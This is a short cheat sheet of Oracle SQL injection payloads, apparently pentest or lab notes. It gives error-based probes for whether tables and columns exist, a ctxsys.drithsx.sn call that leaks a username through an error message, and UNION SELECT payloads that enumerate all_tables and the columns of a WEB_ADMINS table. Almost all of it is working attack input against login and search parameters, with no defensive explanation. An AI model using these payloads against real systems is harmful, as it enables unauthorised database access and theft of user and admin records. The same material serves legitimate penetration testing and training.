### Oracle

Error based SQL injections

check if table exists
```
username=wrong&password=wrong'||(SELECT '' FROM users WHERE ROWNUM = 1)||'--
```

test if column exists in the table 

```
username=wrong&password=wrong'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM web_users WHERE user_name like 'ilhilh')||'--
```

generate error message containing the information

```
username=wrong&password=wrong' and ctxsys.drithsx.sn(1,(select user_name from web_users where rownum = 1)) is null--
```


union select

```
author' order by 3 --

author=eriasdasdac' union select table_name, null, null from all_tables --

author=eriasdasdac' union select column_name, null, null from all_tab_columns where table_name = 'WEB_ADMINS' --
```